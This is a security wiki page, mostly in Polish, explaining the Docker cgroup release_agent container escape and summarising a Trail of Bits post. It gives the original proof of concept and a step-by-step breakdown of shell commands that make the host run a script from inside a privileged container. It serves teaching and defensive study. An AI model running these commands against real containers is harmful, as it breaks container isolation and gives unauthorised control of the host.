# Docker release\_agent cgroups escape

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się trikami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów na githubie.

</details>
{% endhint %}


**Aby uzyskać więcej szczegółów, zapoznaj się z** [**oryginalnym wpisem na blogu**](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)**.** To tylko podsumowanie:

Original PoC:
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
Dowód koncepcji (PoC) demonstruje metodę wykorzystania cgroups poprzez utworzenie pliku `release_agent` i wywołanie go w celu wykonania dowolnych poleceń na hoście kontenera. Oto podział kroków zaangażowanych w ten proces:

1. **Przygotowanie Środowiska:**
* Tworzony jest katalog `/tmp/cgrp`, który służy jako punkt montowania dla cgroup.
* Kontroler cgroup RDMA jest montowany do tego katalogu. W przypadku braku kontrolera RDMA, sugeruje się użycie kontrolera cgroup `memory` jako alternatywy.
```shell
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```
2. **Ustawienie Cgroup Dziecka:**
* Cgroup dziecka o nazwie "x" jest tworzona w zamontowanym katalogu cgroup.
* Powiadomienia są włączone dla cgroup "x" poprzez zapisanie 1 do pliku notify\_on\_release.
```shell
echo 1 > /tmp/cgrp/x/notify_on_release
```
3. **Skonfiguruj agenta zwalniającego:**
* Ścieżka kontenera na hoście jest uzyskiwana z pliku /etc/mtab.
* Plik release\_agent cgroup jest następnie konfigurowany do wykonania skryptu o nazwie /cmd znajdującego się w uzyskanej ścieżce hosta.
```shell
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
4. **Utwórz i skonfiguruj skrypt /cmd:**
* Skrypt /cmd jest tworzony wewnątrz kontenera i jest skonfigurowany do wykonywania ps aux, przekierowując wyjście do pliku o nazwie /output w kontenerze. Pełna ścieżka do /output na hoście jest określona.
```shell
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
```
5. **Wyzwól Atak:**
* Proces jest inicjowany w "x" dziecinnym cgroup i natychmiast kończony.
* To wyzwala `release_agent` (skrypt /cmd), który wykonuje ps aux na hoście i zapisuje wynik do /output w kontenerze.
```shell
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
{% hint style="success" %}
Ucz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel się trikami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.

</details>
{% endhint %}
